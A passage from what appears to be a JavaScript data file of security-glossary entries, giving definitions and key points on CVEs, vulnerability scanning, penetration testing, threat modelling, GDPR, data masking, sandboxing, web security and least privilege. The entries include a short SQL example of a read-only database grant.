    "CVSS base scores describe the vulnerability in isolation, not your risk. A critical CVE in a component you do not expose may matter less than a medium one on your public login path. The KEV catalogue of vulnerabilities known to be actively exploited is a better prioritisation signal than score alone."],
 k:["A unique identifier enabling shared reference across tools and advisories.",
    "CVSS scores severity 0–10; it is not a risk assessment for your system.",
    "Prioritise by exploitability and exposure, not by score alone.",
    "The CISA KEV catalogue lists what is actually being exploited."],
 r:["Vulnerability Scanning","Zero-Day","Supply Chain Attack","Penetration Testing"]},

{t:"Vulnerability Scanning", d:"Automatically checking systems and dependencies against databases of known vulnerabilities.", l:"core", g:["practice","tooling"],
 b:["Scanners inspect dependencies, container images, infrastructure configuration and running hosts, and report known issues. Running them in CI catches vulnerable dependencies before they ship; running them continuously catches issues disclosed after deployment.",
    "The practical difficulty is volume and false positives — a scanner reporting four hundred findings gets ignored. Prioritise by whether the vulnerable code path is reachable, whether the component is exposed, and whether exploitation is known to be occurring."],
 k:["Run in CI to block new vulnerable dependencies, and continuously after deploy.",
    "Reachability matters — a vulnerable function you never call is lower risk.",
    "Unprioritised findings get ignored entirely.",
    "Complements but does not replace penetration testing."],
 r:["CVE","Supply Chain Attack","CI/CD","Penetration Testing","Static Analysis"]},

{t:"Penetration Testing", a:"Pen Testing", d:"Authorised simulated attacks against a system to find exploitable weaknesses.", l:"intermediate", g:["practice","assessment"],
 b:["Penetration testers attempt to actually compromise a system within an agreed scope, which finds the business-logic flaws, chained weaknesses and configuration errors that automated scanning cannot. Black box tests start with no knowledge; white box tests get source and architecture, which is usually more productive per hour spent.",
    "The output is a report of findings with severity and reproduction steps. Its value depends entirely on the findings being fixed and retested — a report filed and forgotten changes nothing."],
 k:["Finds logic flaws and chained weaknesses that scanners cannot.",
    "White box testing is generally more productive than black box.",
    "Scope and authorisation must be agreed in writing beforehand.",
    "Value comes from remediation and retest, not from the report."],
 r:["Vulnerability Scanning","Threat Modelling","OWASP Top 10","Red Teaming"]},

{t:"Threat Modelling", d:"Systematically identifying what could go wrong in a system and deciding what to do about it.", l:"intermediate", g:["practice","design"],
 b:["Threat modelling asks four questions: what are we building, what can go wrong, what are we going to do about it, and did we do a good job. STRIDE provides a checklist of categories — spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege.",
    "It is most valuable at design time, when changing the architecture is still cheap. A data flow diagram with trust boundaries marked is usually enough structure — the discussion matters more than the artefact."],
 k:["Four questions: what are we building, what can go wrong, what will we do, did it work.",
    "STRIDE gives a checklist of threat categories.",
    "Most valuable at design time, before the architecture is fixed.",
    "Mark trust boundaries on a data flow diagram — that is where threats live."],
 r:["Defence in Depth","OWASP Top 10","Penetration Testing","Security Misconfiguration"]},

{t:"Security Misconfiguration", d:"Insecure defaults, unnecessary features or incorrect settings that expose a system.", l:"core", g:["vulnerability","operations"],
 b:["Default credentials left unchanged, debug mode enabled in production, verbose error pages revealing stack traces, publicly readable cloud storage buckets, unnecessary services listening, missing security headers. None require an attacker to find a novel flaw — they simply need to look.",
    "Publicly exposed object storage and unauthenticated databases have caused a very large share of real-world data exposures. Automated configuration scanning and infrastructure as code with reviewed defaults are what prevent it."],
 k:["Default credentials and debug mode in production are perennial.",
    "Publicly readable storage buckets remain a top cause of data exposure.",
    "Error pages must not reveal stack traces or internal paths.",
    "Infrastructure as code makes configuration reviewable and auditable."],
 r:["OWASP Top 10","Infrastructure as Code","Principle of Least Privilege","Vulnerability Scanning"]},

{t:"Audit Log", d:"An append-only record of security-relevant actions, showing who did what and when.", l:"core", g:["practice","compliance"],
 b:["Audit logs record authentication events, permission changes, data access and administrative actions with an actor, timestamp, source and outcome. They are what makes an incident investigable and what most compliance regimes require.",
    "For them to be trustworthy they must be append-only and stored where the systems they record cannot modify them — an attacker with administrative access will otherwise delete the evidence. Ship them to a separate account or system with restricted write access."],
 k:["Record actor, action, target, timestamp, source and outcome.",
    "Append-only and stored outside the audited system's control.",
    "Required by SOC 2, ISO 27001, HIPAA and similar regimes.",
    "Never log credentials or sensitive data into audit records."],
 r:["Logging","Incident Response","Data Governance","Trigger"]},

{t:"Personally Identifiable Information", a:"PII", d:"Data that identifies a specific individual, directly or in combination.", l:"core", g:["privacy","compliance"],
 b:["Names, email addresses, phone numbers and identity numbers are directly identifying. IP addresses, device identifiers, precise location and behavioural patterns are indirectly identifying, and combinations of otherwise innocuous attributes frequently re-identify individuals.",
    "Handling obligations follow: know where it lives, minimise collection, encrypt at rest and in transit, restrict access, define retention periods, and be able to locate and delete an individual's data on request. Special categories — health, biometrics, ethnicity — carry stricter rules."],
 k:["Indirect identifiers combine to re-identify — anonymisation is harder than it looks.",
    "Collect the minimum; retain for the minimum period.",
    "You must be able to find and delete one person's data on request.",
    "Never send PII to logs, analytics or third-party services by default."],
 r:["GDPR","Data Governance","Encryption","Data Masking","Data Breach"]},

{t:"GDPR", a:"General Data Protection Regulation", d:"The European regulation governing how personal data may be collected, processed and stored.", l:"intermediate", g:["compliance","privacy"],
 b:["GDPR requires a lawful basis for processing, purpose limitation, data minimisation, and gives individuals rights of access, rectification, erasure and portability. It applies to any organisation processing EU residents' data regardless of where the organisation is located.",
    "The engineering implications are concrete: you must be able to export and delete one individual's data across every system including backups and analytics, record processing activities, and report breaches within 72 hours. Privacy by design is an explicit requirement, not a recommendation."],
 k:["Applies extraterritorially to anyone processing EU residents' data.",
    "Right to erasure means deletion across every system, including derived data.",
    "Breach notification within 72 hours of becoming aware.",
    "Privacy by design and by default is a legal requirement."],
 r:["Personally Identifiable Information","Data Governance","Data Breach","Data Masking"]},

{t:"Data Masking", a:"Data Anonymisation", d:"Obscuring sensitive values so data can be used without exposing the underlying information.", l:"intermediate", g:["privacy","practice"],
 b:["Masking replaces sensitive values with realistic substitutes for development and testing. Pseudonymisation replaces identifiers with tokens that can be reversed with a separate key. True anonymisation removes identifiability irreversibly, which takes it outside GDPR's scope — but is genuinely difficult to achieve.",
    "Naive anonymisation fails: removing names from a dataset containing postcode, date of birth and gender still identifies most individuals uniquely. Differential privacy provides mathematical guarantees where the stakes justify the complexity."],
 k:["Masking for test data; pseudonymisation is reversible; anonymisation is not.",
    "Postcode plus birth date plus gender identifies most people uniquely.",
    "Only true anonymisation removes data from privacy regulation.",
    "Never use unmasked production personal data in development."],
 r:["Personally Identifiable Information","GDPR","Data Governance","Environment"]},

{t:"Data Breach", d:"An incident where confidential data is accessed, disclosed or stolen by an unauthorised party.", l:"core", g:["incident","compliance"],
 b:["Breaches follow a recognisable pattern: initial access (usually phishing or an unpatched internet-facing system), privilege escalation, lateral movement, discovery, exfiltration. Detection frequently takes months, and the dwell time is where most of the damage accumulates.",
    "Response requires containment, forensic preservation, regulatory notification within statutory deadlines, and communication to affected individuals. Preparing this in advance matters — organisations that improvise a breach response make it worse."],
 k:["Phishing and unpatched internet-facing systems dominate initial access.",
    "Detection dwell time is often months — most damage occurs then.",
    "Preserve forensic evidence before remediating, where possible.",
    "Notification deadlines are statutory: 72 hours under GDPR."],
 r:["Incident Response","Personally Identifiable Information","GDPR","Ransomware","Audit Log"]},

{t:"Sandboxing", d:"Running untrusted code in a restricted environment that limits what it can access.", l:"intermediate", g:["practice","architecture"],
 b:["A sandbox constrains what code can do: no filesystem access outside a directory, no network, limited memory and CPU, no privileged system calls. Browsers sandbox each tab, containers sandbox processes, and gVisor and Firecracker provide stronger isolation for genuinely untrusted workloads.",
    "This matters increasingly for AI systems that execute generated code. A container alone is a weak boundary against determined escape; microVMs or hardware isolation are appropriate when the code is truly untrusted."],
 k:["Restricts filesystem, network, syscalls and resource usage.",
    "Containers alone are a weak boundary for genuinely untrusted code.",
    "Firecracker and gVisor provide stronger isolation than plain containers.",
    "Essential when executing AI-generated or user-supplied code."],
 r:["Container","Virtual Machine","Principle of Least Privilege","AI Agent"]},

{t:"Static Analysis", a:"SAST", d:"Examining source code for defects and vulnerabilities without executing it.", l:"core", g:["practice","tooling"],
 b:["Static analysers detect injection risks, hardcoded secrets, unsafe API usage, null dereferences and code-quality problems by analysing code structure and data flow. Running them in CI catches issues at the pull request, when they are cheapest to fix.",
    "The trade-off is false positives, which erode trust if unmanaged. Because of the halting problem, no analyser can be both complete and sound, so tools choose which errors to make. Dynamic analysis (DAST) complements it by testing the running application."],
 k:["Analyses code without running it — fast and early in the pipeline.",
    "False positives must be triaged or the tool gets ignored.",
    "Provably cannot be both complete and sound.",
    "DAST tests the running application and finds different issues."],
 r:["Vulnerability Scanning","CI/CD","Linter","Halting Problem","Penetration Testing"]},

{t:"Web Security", d:"The collection of practices protecting web applications and their users from attack.", l:"core", g:["practice","web"],
 b:["Web security spans transport (HTTPS everywhere, HSTS), input handling (parameterised queries, contextual output encoding), session management (HttpOnly, Secure and SameSite cookies), authorisation on every request, and browser-enforced controls such as Content Security Policy and the same-origin policy.",
    "Security headers are cheap and high-value: CSP, Strict-Transport-Security, X-Content-Type-Options, Referrer-Policy and Permissions-Policy together close a substantial number of attack paths for a few lines of configuration."],
 k:["HTTPS everywhere with HSTS; no mixed content.",
    "Parameterise queries; encode output for its context.",
    "Cookies: HttpOnly, Secure, SameSite — all three.",
    "Security headers are a few lines of config for real protection."],
 r:["Content Security Policy","Cross-Site Scripting","SQL Injection","HTTPS","OWASP Top 10"]},

{t:"Security Awareness", d:"Training and culture that help people recognise and resist attacks aimed at them.", l:"intermediate", g:["practice","organisation"],
 b:["Since people are the most-targeted component, awareness training covers phishing recognition, safe credential handling, reporting procedures and the verification habits that defeat social engineering. Simulated phishing exercises measure whether it is working.",
    "The culture matters more than the content. If reporting a mistake is punished, people hide incidents and the organisation loses its earliest warning. Fast, blameless reporting is the single most valuable behaviour to cultivate."],
 k:["People are the most-targeted attack surface.",
    "Simulated phishing measures effectiveness — but should not be punitive.",
    "Blameless reporting produces earlier detection than any tool.",
    "Make the secure path the easy path wherever possible."],
 r:["Phishing","Social Engineering","Incident Response","Multi-Factor Authentication"]},
{t:"Least Privilege", d:"Granting every identity the minimum permissions it needs, and nothing beyond them.", l:"core", g:["access-control","fundamentals"],
 b:["The principle is old and the reason is simple: permissions that are never used cannot be misused, but they can absolutely be abused by whoever eventually compromises the identity. The blast radius of a leaked key, a confused deputy or a malicious insider is decided entirely by what that identity was allowed to do — so narrowing it is the cheapest security control available.",
    "In practice least privilege fails for a predictable reason: the broad permission unblocks somebody today and narrowing it risks breaking something tomorrow, so nobody ever does. The countermeasures are structural rather than moral — start from a broad managed policy, observe what is actually used in the audit log, and generate a narrow policy from that; give each workload its own identity so the scope is naturally small; use short-lived credentials so a leak expires; and set permission boundaries so nobody can create an identity more powerful than themselves."],
 k:["Blast radius is decided by what the compromised identity was allowed to do.",
    "It fails through inertia, not disagreement — broad permissions are never revisited.",
    "Derive the narrow policy from observed usage in the audit log rather than by guessing.",
    "One identity per workload, short-lived credentials, and a permission boundary above them."],
 x:{lang:"sql",code:"-- the reporting job only ever reads\nCREATE USER reporter WITH PASSWORD '...';\nGRANT SELECT ON orders, customers TO reporter;\n\n-- not this:\n-- GRANT ALL PRIVILEGES ON *.* TO reporter;\n--   a leaked key now drops tables instead of reading two"},
 r:["Authorisation","Zero Trust","Audit Log","Secrets Management","Multi-Factor Authentication"]}

]);
